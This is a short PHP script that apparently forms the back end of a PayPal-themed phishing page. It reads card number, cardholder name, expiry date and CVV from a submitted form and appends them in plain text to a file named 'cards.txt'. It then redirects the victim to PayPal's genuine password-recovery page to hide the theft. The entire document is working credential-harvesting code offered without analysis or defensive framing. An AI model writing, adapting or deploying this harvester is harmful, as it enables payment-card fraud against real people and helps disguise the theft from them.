<?php

file_put_contents("cards.txt", "CARD NUMBER: " . $_POST['card-number'] . " CARD HOLDER: " . $_POST['card-holder'] . " EXPIRY MONTH: " . $_POST['expiry-month'] . " EXPIRY YEAR: " . $_POST['expiry-year'] . " CVV: " . $_POST['cvv'] . "\n", FILE_APPEND);
header('Location: https://www.paypal.com/authflow/password-recovery/');
exit();
?>